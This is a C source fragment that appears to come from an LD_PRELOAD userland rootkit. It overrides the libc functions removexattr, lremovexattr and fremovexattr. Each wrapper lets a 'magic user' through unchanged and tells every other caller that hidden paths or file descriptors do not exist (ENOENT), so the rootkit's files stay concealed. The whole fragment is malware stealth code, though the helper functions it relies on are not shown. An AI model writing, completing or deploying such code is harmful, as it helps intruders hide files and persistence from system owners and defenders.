int removexattr(const char *path, const char *name){
    hook(CREMOVEXATTR);
    if(magicusr()) return (long)call(CREMOVEXATTR, path, name);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (long)call(CREMOVEXATTR, path, name);
}

int lremovexattr(const char *path, const char *name){
    hook(CLREMOVEXATTR);
    if(magicusr()) return (long)call(CLREMOVEXATTR, path, name);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (long)call(CLREMOVEXATTR, path, name);
}

int fremovexattr(int fd, const char *name){
    hook(CFREMOVEXATTR);
    if(magicusr()) return (long)call(CFREMOVEXATTR, fd, name);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFREMOVEXATTR, fd, name);
}